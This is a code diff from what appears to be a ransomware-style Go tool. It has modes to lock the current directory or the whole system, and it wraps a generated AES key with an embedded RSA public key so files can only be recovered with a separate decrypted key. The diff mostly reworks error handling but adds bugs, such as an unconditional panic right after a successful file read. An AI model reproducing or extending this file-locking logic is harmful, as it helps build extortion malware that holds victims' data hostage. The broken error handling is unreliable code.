@@ -10,12 +10,6 @@ import (
 	"frostbite.com/tools/system"
 )
 
-func ErrCheck(err error) {
-	if err != nil {
-		panic(err)
-	}
-}
-
 //go:embed keys/public.key
 var pubKeyVar []byte
 
@@ -61,12 +55,17 @@ func SetModeOfOperation() {
 	pl("Mode of operation set to:", Mode)
 }
 
-func ModeDecrypt() {
+func ModeDecrypt() error {
 	AESKey, err := os.ReadFile("decrypted.key")
-	ErrCheck(err)
+	if err != nil {
+		return err
+	}
 	currentDir, err := os.Getwd()
-	ErrCheck(err)
+	if err != nil {
+		return err
+	}
 	file.DecryptFilesInDir(currentDir, true, AESKey)
+	return nil
 }
 
 func ModeLockCurrentDir() {
@@ -85,14 +84,22 @@ func ModeLockSystem() {
 }
 
 func generateAesAndEncryptedAes() ([]byte, []byte) {
-	key := enc.GenerateAES()
+	key, err := enc.GenerateAES()
+	if err != nil {
+		pl("Panicking")
+		panic(err)
+	}
 
 	//use local public key to encrypt aes key if it exists, else use the embedded public key
 	//read "public.key" from current dir and "keys/public.key"
 	//if both files exist, use the one in the current dir
 	publicKey := readPubKeyFromFileOrEmbedded()
 
-	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(publicKey))
+	publicKeyBytes, err := enc.BytesToPublicKey(publicKey)
+	if err != nil {
+		panic(err)
+	}
+	encryptedAESKey, err = enc.EncryptWithPublicKey(key, publicKeyBytes)
 
 	return key, encryptedAESKey
 }
@@ -103,10 +110,10 @@ func readPubKeyFromFileOrEmbedded() []byte {
 
 	if _, err := os.Stat("public.key"); err == nil {
 		publicKey, err = os.ReadFile("public.key")
-		ErrCheck(err)
+		panic(err)
 	} else if _, err := os.Stat("keys/public.key"); err == nil {
 		publicKey, err = os.ReadFile("keys/public.key")
-		ErrCheck(err)
+		panic(err)
 	} else {
 		publicKey = pubKeyVar
 		if len(publicKey) == 0 {
@@ -117,6 +124,8 @@ func readPubKeyFromFileOrEmbedded() []byte {
 }
 func ModeUnlockSystem() {
 	AESKey, err := os.ReadFile("decrypted.key")
-	ErrCheck(err)
+	if err != nil {
+		panic(err)
+	}
 	system.WholeSystemDecrypt(AESKey)
 }
